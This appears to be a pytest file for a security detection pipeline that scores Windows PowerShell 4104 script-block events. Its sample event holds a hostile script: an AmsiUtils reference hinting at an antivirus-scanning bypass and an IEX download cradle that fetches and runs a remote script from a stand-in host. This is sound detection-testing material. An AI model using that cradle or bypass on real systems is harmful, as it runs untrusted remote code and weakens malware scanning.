# dfs-core/tests/test_powershell_4104.py
from dfs_core.pipeline import evaluate_event


def test_powershell_4104_gold_scores_higher_than_degraded():
    gold = {
        "event": {"code": 4104},
        "host": {"name": "WS-0231"},
        "user": {"name": "jdoe"},
        "winlog": {
            "event_data": {
                "ScriptBlockText": r"""
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | Out-Null
IEX (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')
"""
            }
        }
    }

    degraded = {
        "event": {"code": 4104},
        "host": {"name": "WS-0231"},
        "user": {"name": "jdoe"},
        "winlog": {"event_data": {"ScriptBlockText": "[REDACTED_OR_MISSING]"}}
    }

    r1 = evaluate_event(gold, kind="windows-powershell-4104", policy_path="policies/powershell_4104.policy.json")
    r2 = evaluate_event(degraded, kind="windows-powershell-4104", policy_path="policies/powershell_4104.policy.json")

    assert r1.card.score > r2.card.score

    # sanity: notes should include at least one reason if degraded
    assert isinstance(r2.card.notes, list)
